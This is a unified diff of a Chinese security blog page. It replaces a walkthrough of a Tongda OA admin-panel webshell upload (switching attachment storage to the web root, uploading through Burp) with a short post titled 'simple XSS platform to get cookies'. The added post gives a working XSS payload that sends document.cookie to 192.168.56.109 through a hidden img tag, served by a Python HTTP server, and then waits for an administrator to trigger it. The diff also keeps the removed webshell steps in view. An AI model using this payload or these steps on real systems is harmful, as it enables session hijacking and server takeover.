@@ -22,33 +22,22 @@
     var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Gemini","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="0x01 如何后台怎么进入后台随便你，可以利用前段时间的任意用户登录漏洞">
+  <meta name="description" content="1、启用python http服务器   2、在有xss的地方插入截获代码 1&lt;script&gt;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;192.168.56.109&#x2F;&#39;+document.cookie+&#39;&quot; width&#x3D;0 height&#x3D;0 border&#x3D;0 &#x2F;&gt;&#39;);&lt;&#x2F;script&gt;  3、等待管理员触发漏洞后，便会截获到cookie">
 <meta property="og:type" content="article">
-<meta property="og:title" content="通达OA 后台GetShell">
-<meta property="og:url" content="http://yoursite.com/2020/%E9%80%9A%E8%BE%BEOA3.html">
+<meta property="og:title" content="简易xss平台 获取Cookie">
+<meta property="og:url" content="http://yoursite.com/2020/xss%E8%8E%B7%E5%8F%96.html">
 <meta property="og:site_name" content="TBOsec的网络日志">
-<meta property="og:description" content="0x01 如何后台怎么进入后台随便你，可以利用前段时间的任意用户登录漏洞">
+<meta property="og:description" content="1、启用python http服务器   2、在有xss的地方插入截获代码 1&lt;script&gt;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;192.168.56.109&#x2F;&#39;+document.cookie+&#39;&quot; width&#x3D;0 height&#x3D;0 border&#x3D;0 &#x2F;&gt;&#39;);&lt;&#x2F;script&gt;  3、等待管理员触发漏洞后，便会截获到cookie">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://yoursite.com/images/upload/loginadmin.png">
-<meta property="og:image" content="http://yoursite.com/images/upload/fujian.png">
-<meta property="og:image" content="http://yoursite.com/images/upload/fujian2.png">
-<meta property="og:image" content="http://yoursite.com/images/upload/fujian3.png">
-<meta property="og:image" content="http://yoursite.com/images/upload/fujian4.png">
-<meta property="og:image" content="http://yoursite.com/images/upload/fujian5.png">
-<meta property="og:image" content="http://yoursite.com/images/upload/fujian6.png">
-<meta property="og:image" content="http://yoursite.com/images/upload/oa31.png">
-<meta property="og:image" content="http://yoursite.com/images/upload/oa3.png">
-<meta property="og:image" content="http://yoursite.com/images/upload/oa32.png">
-<meta property="og:image" content="http://yoursite.com/images/upload/oa33.png">
-<meta property="og:image" content="http://yoursite.com/images/upload/oa34.png">
-<meta property="article:published_time" content="2020-05-16T11:12:20.000Z">
-<meta property="article:modified_time" content="2020-05-16T12:53:44.582Z">
+<meta property="og:image" content="http://yoursite.com/images/upload/python3.png">
+<meta property="og:image" content="http://yoursite.com/images/upload/cookie.png">
+<meta property="article:published_time" content="2020-06-30T07:38:52.000Z">
+<meta property="article:modified_time" content="2020-07-05T05:26:02.534Z">
 <meta property="article:author" content="TBOsec">
-<meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/images/upload/loginadmin.png">
+<meta name="twitter:image" content="http://yoursite.com/images/upload/python3.png">
 
-<link rel="canonical" href="http://yoursite.com/2020/%E9%80%9A%E8%BE%BEOA3.html">
+<link rel="canonical" href="http://yoursite.com/2020/xss%E8%8E%B7%E5%8F%96.html">
 
 
 <script id="page-configurations">
@@ -60,7 +49,7 @@
   };
 </script>
 
-  <title>通达OA 后台GetShell | TBOsec的网络日志</title>
+  <title>简易xss平台 获取Cookie | TBOsec的网络日志</title>
   
 
 
@@ -201,7 +190,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/%E9%80%9A%E8%BE%BEOA3.html">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/xss%E8%8E%B7%E5%8F%96.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -214,7 +203,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          通达OA 后台GetShell
+          简易xss平台 获取Cookie
         </h2>
 
         <div class="post-meta">
@@ -224,16 +213,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2020-05-16 19:12:20" itemprop="dateCreated datePublished" datetime="2020-05-16T19:12:20+08:00">2020-05-16</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%80%9A%E8%BE%BEOA/" itemprop="url" rel="index"><span itemprop="name">通达OA</span></a>
-                </span>
+              <time title="创建时间：2020-06-30 15:38:52" itemprop="dateCreated datePublished" datetime="2020-06-30T15:38:52+08:00">2020-06-30</time>
             </span>
 
           
@@ -247,28 +227,14 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="0x01-如何后台"><a href="#0x01-如何后台" class="headerlink" title="0x01 如何后台"></a>0x01 如何后台</h3><p>怎么进入后台随便你，可以利用前段时间的<code>任意用户登录漏洞</code></p>
-<p><img src="../images/upload/loginadmin.png" alt="login"></p>
-<a id="more"></a>
+        <p>1、启用python http服务器</p>
+<img src="../images/upload/python3.png" style="zoom:67%;" />
 
-<h3 id="0x02-更改配置"><a href="#0x02-更改配置" class="headerlink" title="0x02 更改配置"></a>0x02 更改配置</h3><p>此处利用系统管理-&gt;附件管理📎</p>
-<p><img src="../images/upload/fujian.png" alt="fujian"></p>
-<p>此站点并未设置存储目录，点击添加目录</p>
-<p><img src="../images/upload/fujian2.png" alt="fujian"></p>
-<p>目录中要设置网站根目录，根目录可以通过系统管理-&gt;系统信息处获得</p>
-<p><img src="../images/upload/fujian3.png" alt="gujian3"></p>
-<p><img src="../images/upload/fujian4.png" alt="fujian4"></p>
-<p>记得勾选<code>将所有新附件存该目录</code>，然后保存</p>
-<p><img src="../images/upload/fujian5.png" alt="fujian5"></p>
-<h3 id="0x03-上传附件"><a href="#0x03-上传附件" class="headerlink" title="0x03 上传附件"></a>0x03 上传附件</h3><p>通过组织下的聊天框，选中自己后发送任意附件，利用BurpSuite拦截</p>
-<p><img src="../images/upload/fujian6.png" alt="fujian6"></p>
-<p><img src="../images/upload/oa31.png" alt="oa31"></p>
-<p><a href="../file/upshell.txt">上传附件 request.txt</a></p>
-<p><img src="../images/upload/oa3.png" alt="oa3"></p>
-<p><img src="../images/upload/oa32.png" alt="oa32"></p>
-<p><img src="../images/upload/oa33.png" alt="oa33"></p>
-<p><img src="../images/upload/oa34.png" alt="oa34"></p>
+<p>2、在有xss的地方插入截获代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.write(<span class="string">'&lt;img src="http://192.168.56.109/'</span>+<span class="built_in">document</span>.cookie+<span class="string">'" width=0 height=0 border=0 /&gt;'</span>);&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
 
+<p>3、等待管理员触发漏洞后，便会截获到cookie</p>
+<img src="../images/upload/cookie.png" style="zoom: 67%;" />
     </div>
 
     
@@ -320,9 +286,6 @@
 
 
       <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"># 漏洞复现</a>
-          </div>
 
         
 
@@ -330,12 +293,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2020/%E9%80%9A%E8%BE%BEOA2.html" rel="prev" title="通达OA 任意文件上传/文件包含GetShell">
-      <i class="fa fa-chevron-left"></i> 通达OA 任意文件上传/文件包含GetShell
+    <a href="/2020/linux%E7%89%88%E6%9C%AC.html" rel="prev" title="linux 查看硬件架构|系统版本|内核版本">
+      <i class="fa fa-chevron-left"></i> linux 查看硬件架构|系统版本|内核版本
     </a></div>
       <div class="post-nav-item">
-    <a href="/2020/linux%E7%89%88%E6%9C%AC.html" rel="next" title="linux 查看硬件架构|系统版本|内核版本">
-      linux 查看硬件架构|系统版本|内核版本 <i class="fa fa-chevron-right"></i>
+    <a href="/2020/%E5%B8%B8%E7%94%A8%E5%8F%8D%E5%90%91shell.html" rel="next" title="常见反向shell方法">
+      常见反向shell方法 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -396,7 +359,6 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-如何后台"><span class="nav-text">0x01 如何后台</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-更改配置"><span class="nav-text">0x02 更改配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-上传附件"><span class="nav-text">0x03 上传附件</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
